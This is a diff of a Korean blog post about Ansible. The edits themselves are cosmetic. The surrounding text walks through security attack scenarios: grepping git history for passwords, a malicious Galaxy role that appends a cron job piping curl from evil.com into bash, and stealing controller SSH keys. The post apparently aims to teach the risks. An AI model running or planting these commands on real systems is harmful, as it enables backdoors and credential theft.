@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: "Ansible"
 date: 2025-12-10 17:00:00 +0900
@@ -16,6 +16,7 @@ Python으로 개발되었으며, 관리 대상 서버에 별도의 에이전트(
 *   **YAML 기반**: Playbook을 YAML 포맷으로 작성하여 가독성이 뛰어나다.
 
 ### Terraform vs Ansible
+
 | 구분 | Ansible | Terraform |
 |------|---------|-----------|
 | **주 목적** | **구성 관리 (Configuration)** | **프로비저닝 (Provisioning)** |
@@ -236,7 +237,7 @@ git log -p --all | grep -i "password"
 ssh root@node1  # 비밀번호: It1
 ```
 
-**[공격 결과]**: Git 저장소 접근 → 서버 자격 증명 탈취 → 인프라 장악 🔓
+**[공격 결과]**: Git 저장소 접근 → 서버 자격 증명 탈취 → 인프라 장악
 
 ---
 
@@ -267,7 +268,7 @@ ansible-galaxy install evil-hacker.nginx-backdoor
     echo "* * * * * root curl https://evil.com/beacon | bash" >> /etc/crontab
 ```
 
-**[공격 결과]**: 악성 Role 사용 → 전체 관리 서버 백도어 설치 🔓
+**[공격 결과]**: 악성 Role 사용 → 전체 관리 서버 백도어 설치
 
 ---
 
@@ -296,7 +297,7 @@ ssh -i ~/.ssh/id_rsa root@node2
 # 전체 인프라 장악
 ```
 
-**[공격 결과]**: Controller 침투 → SSH 키 탈취 → 전체 관리 서버 장악 🔓
+**[공격 결과]**: Controller 침투 → SSH 키 탈취 → 전체 관리 서버 장악
 
 ---
 
